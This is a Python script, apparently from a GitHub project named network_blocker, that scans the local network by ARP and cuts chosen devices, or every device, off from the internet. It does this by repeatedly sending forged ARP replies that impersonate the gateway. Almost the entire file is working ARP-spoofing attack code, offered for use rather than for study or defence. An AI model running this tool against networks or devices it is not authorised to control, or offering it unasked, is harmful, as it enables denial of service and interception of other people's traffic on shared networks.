#
# Github: https://github.com/fakuventuri/network_blocker
#
# This script is used to block a device on your network.
#
# Usage:
#   sudo python3 network_blocker.py
#
import os
import sys
import time

import socket
import ipaddress
import subprocess
import atexit

from threading import Thread, Event

from typing import List, Tuple

import re
def antiinet():
    try:
        from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr
        from tabulate import tabulate
        import netifaces
    except ImportError:
        print("Required dependencies not found.")
        print("Please install the required packages with the following command:")
        print("pip install scapy tabulate netifaces")
        sys.exit(1)

    if sys.platform == "win32":
        try:
            import ctypes

            ctypes.windll.kernel32.SetConsoleTitleW("Network Blocker")
        except ImportError:
            print("Required dependencies not found.")
            print("Please install the required packages with the following command:")
            print("pip install ctypes")
            sys.exit(1)


    def is_admin():
        try:
            if sys.platform == "win32":
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except AttributeError:
            print("Unable to determine if script is running with administrator privileges.")
            sys.exit(1)


    def get_default_interface():
        interfaces = netifaces.interfaces()
        default_interface = None

        # show and let the user select the interface
        print("Available interfaces:\n")
        for index, interface in enumerate(interfaces):
            print(str(index) + ": " + interface + "\n")
        while default_interface is None:
            try:
                default_interface = interfaces[int(input("Select interface: "))]
            except ValueError:
                print("Invalid input, please try again.\n")
            except KeyboardInterrupt:
                print("\nExiting...")
                sys.exit(1)
            except IndexError:
                print("Invalid input, please try again.\n")

        return default_interface


    def get_default_gateway():
        if sys.platform == "win32":
            default_gateway = netifaces.gateways()["default"][netifaces.AF_INET][0]
            return default_gateway
        else:
            cmd = "ip -o -4 route show to default"
            output = subprocess.check_output(cmd, shell=True).decode(
                "utf-8", errors="ignore"
            )
            return output.split()[2]


    def scan_network(ip_range: str) -> List[Tuple[str, str, str]]:
        arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range)
        answered, _ = srp(arp_req, timeout=3, verbose=False)

        device_list = []

        for _, rcv in answered:
            ip = rcv[ARP].psrc
            mac = rcv[Ether].src

            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except socket.herror:
                hostname = "Unknown"
            device_list.append((ip, mac, hostname))

        return device_list


    def generate_devices_table(
        device_list: List[Tuple[str, str, str]], blocked_devices_threads, gateway_ip: str
    ):
        headers = ["Index", "IP Address", "MAC Address", "Hostname", "Blocked"]
        table = [
            [
                index if device[0] != gateway_ip else "Gateway",
                device[0],
                device[1],
                device[2],
                "Yes"
                if any(process._args[1] == device[0] for process in blocked_devices_threads)
                else "No"
                if device[0] != gateway_ip
                else "N/A",
            ]
            for index, device in enumerate(device_list)
        ]

        return tabulate(table, headers=headers, tablefmt="grid")


    def send_spoofed_packet(iface, target_ip, target_mac, gateway_ip, hw_address):
        packet = Ether(src=hw_address, dst=target_mac) / ARP(
            hwsrc=hw_address, psrc=gateway_ip, hwdst=target_mac, pdst=target_ip, op=2
        )
        sendp(packet, iface=iface, verbose=False)


    def arp_spoof(iface, target_ip, target_mac, gateway_ip, stopEvent):
        hw_address = get_if_hwaddr(iface)

        while True:
            send_spoofed_packet(iface, target_ip, target_mac, gateway_ip, hw_address)
            time.sleep(1)

            if stopEvent.is_set():
                print("ARP spoofing on", target_ip, "stopped.")
                break


    def block_device(
        device: Tuple[str, str, str],
        gateway_ip: str,
        iface: str,
    ) -> Tuple[subprocess.Popen, Event]:
        target_ip, target_mac, hostname = device

        # start the arp spoofing process
        stopEvent = Event()
        process = Thread(
            target=arp_spoof, args=(iface, target_ip, target_mac, gateway_ip, stopEvent)
        )
        process.daemon = True
        process.start()

        atexit.register(process.join)

        # return the process
        return process, stopEvent


    def print_menu():
        if sys.platform == "win32":
            os.system("cls")
        else:
            os.system("clear")

        print("\n#                      Welcome to Network Blocker                    #")
        print("               Script to block a device on your network                \n")


    def print_complete_menu(
        device_list, blocked_devices_threads, IPAddr, gateway_ip, iface
    ):
        print_menu()

        print(
            generate_devices_table(device_list, blocked_devices_threads, gateway_ip), "\n"
        )

        print("Your IP Address is: ", IPAddr)
        print("Interface: ", iface, "\n")
        print("Blocked devices: ", len(blocked_devices_threads), "\n")


    def main():
        print_menu()

        if not is_admin():
            if sys.platform == "win32":
                # print("Requesting administrator privileges...")
                # script = os.path.abspath(sys.argv[0])
                # ctypes.windll.shell32.ShellExecuteW(
                #     None, "runas", sys.executable, f'"{script}"', None, 1
                # )
                print("Please run this script with administrator privileges.\n")
                sys.exit(1)
            else:
                print("Please run this script with root privileges.\n")
                print("Example: sudo python3 network_blocker.py")
            sys.exit(1)

        iface = get_default_interface()

        ip_info = netifaces.ifaddresses(iface)
        iface_netmask = ip_info[netifaces.AF_INET][0]['netmask']
        iface_ip = ip_info[netifaces.AF_INET][0]['addr']
        ip_range = str(ipaddress.IPv4Network(f"{iface_ip}/{iface_netmask}", strict=False)) # the ip range to scan

        print("Default interface: ", iface)

        gateway_ip = get_default_gateway()

        print("Gateway IP: ", gateway_ip)

        print("\nScanning network...")

        # get the local ip address
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        IPAddr = s.getsockname()[0]
        s.close()

        # scan the network and get the list of devices
        device_list = scan_network(ip_range)

        blocked_devices_threads = []
        stopEventsMap = {}

        if not device_list:
            print("No devices found.")
            sys.exit(1)

        print_complete_menu(device_list, blocked_devices_threads, IPAddr, gateway_ip, iface)

        try:
            while True:
                try:
                    # get the user's choice
                    print(
                        "  Enter the index of the device to block/unblock\n  0 to block all\n -3 to rescan the network\n -2 to unblock all\n -1 to exit (Ctrl+C)\n"
                    )
                    choice = int(input("~> "))

                    if choice == -1:
                        # exit the script
                        break
                    elif choice == -2:
                        # unblock all devices
                        if blocked_devices_threads:
                            print_complete_menu(
                                device_list,
                                blocked_devices_threads,
                                IPAddr,
                                gateway_ip,
                                iface,
                            )
                            print("Unblocking all devices...")
                            for process in blocked_devices_threads:
                                stopEventsMap[process._args[1]].set()
                                process.join()

                            blocked_devices_threads.clear()
                            stopEventsMap.clear()

                            print_complete_menu(
                                device_list,
                                blocked_devices_threads,
                                IPAddr,
                                gateway_ip,
                                iface,
                            )
                        else:
                            print_complete_menu(
                                device_list,
                                blocked_devices_threads,
                                IPAddr,
                                gateway_ip,
                                iface,
                            )
                            print("No devices are blocked.\n")
                    elif choice == -3:
                        # rescan the network
                        if sys.platform == "win32":
                            os.system("cls")
                        else:
                            os.system("clear")
                        print_menu()
                        print("Scanning network...")
                        device_list = scan_network(ip_range)
                        print_complete_menu(
                            device_list, blocked_devices_threads, IPAddr, gateway_ip, iface
                        )
                    elif choice == 0:
                        # block all devices
                        if len(blocked_devices_threads) < len(device_list) - 1:
                            print_complete_menu(
                                device_list,
                                blocked_devices_threads,
                                IPAddr,
                                gateway_ip,
                                iface,
                            )
                            print("Blocking all devices...")
                            for device in device_list:
                                # check if the device is the gateway and prevent it
                                if device[0] == gateway_ip:
                                    continue
                                process, e = block_device(device, gateway_ip, iface)
                                blocked_devices_threads.append(process)
                                stopEventsMap[device[0]] = e
                            print_complete_menu(
                                device_list,
                                blocked_devices_threads,
                                IPAddr,
                                gateway_ip,
                                iface,
                            )
                        else:
                            print_complete_menu(
                                device_list,
                                blocked_devices_threads,
                                IPAddr,
                                gateway_ip,
                                iface,
                            )
                            print("All devices are already blocked.\n")
                    elif 0 < choice < len(device_list):
                        # block/unblock the selected device
                        # check if the user selected the gateway and prevent it
                        if device_list[choice][0] == gateway_ip:
                            print_complete_menu(
                                device_list,
                                blocked_devices_threads,
                                IPAddr,
                                gateway_ip,
                                iface,
                            )

                            print("You cannot block your gateway.\n")
                            continue

                        print_complete_menu(
                            device_list, blocked_devices_threads, IPAddr, gateway_ip, iface
                        )
                        print("selected device: ", choice)
                        selected_device = device_list[choice]

                        if any(
                            process._args[1] == selected_device[0]
                            for process in blocked_devices_threads
                        ):
                            print("\nUnblocking", selected_device[0])

                            for process in blocked_devices_threads:
                                if process._args[1] == selected_device[0]:
                                    stopEventsMap[process._args[1]].set()
                                    del stopEventsMap[process._args[1]]
                                    blocked_devices_threads.remove(process)
                                    process.join()
                        else:
                            print("\nBlocking", selected_device[0])

                            process, e = block_device(selected_device, gateway_ip, iface)

                            blocked_devices_threads.append(process)
                            stopEventsMap[selected_device[0]] = e

                        print_complete_menu(
                            device_list, blocked_devices_threads, IPAddr, gateway_ip, iface
                        )
                    else:
                        print_complete_menu(
                            device_list, blocked_devices_threads, IPAddr, gateway_ip, iface
                        )

                        print("Invalid choice. Please try again.\n")
                except ValueError:
                    print_complete_menu(
                        device_list, blocked_devices_threads, IPAddr, gateway_ip, iface
                    )

                    print("Invalid input. Please enter a number.    \n")
        except KeyboardInterrupt:
            print("")
        finally:
            if blocked_devices_threads:
                print_complete_menu(
                    device_list, blocked_devices_threads, IPAddr, gateway_ip, iface
                )
                print("Terminating all processes...\n")
                for process in blocked_devices_threads:
                    stopEventsMap[process._args[1]].set()
                    process.join()
            print("\nClosing...")

    try:
        main()
    except KeyboardInterrupt:
        print("\nClosing...")
    pass
